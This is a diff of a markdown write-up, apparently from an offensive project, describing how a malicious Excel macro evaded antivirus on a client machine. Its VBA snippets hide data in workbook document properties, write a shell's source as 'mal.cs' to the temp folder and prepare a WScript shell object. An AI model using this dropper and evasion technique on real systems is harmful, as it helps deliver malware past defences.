@@ -17,13 +17,11 @@ The requirement was to bypass a note AV software installed on a client machine. 
 `var = ActiveWorkbook.BuiltinDocumentProperties(5)`<br>
 I used a file system object to write the source code of the shell to the user temp folder
 `Dim path As String
-    path = Environ("Temp")
-            
-    Dim FSO As Object
-    Set FSO = CreateObject("Scripting.FileSystemObject")
-    Dim oFile As Object
-    
-    Set oFile = FSO.CreateTextFile(path & "\mal.cs")`
+ path = Environ("Temp")
+ Dim FSO As Object
+ Set FSO = CreateObject("Scripting.FileSystemObject")
+ Dim oFile As Object
+ Set oFile = FSO.CreateTextFile(path & "\mal.cs")`
 * I used the same technique to get the port that is parametric and to initialize the wscript shell object<br>
 ![Screenshot](screen/propxlsm.png)
 <br>`shellObj = ActiveWorkbook.BuiltinDocumentProperties(4)`
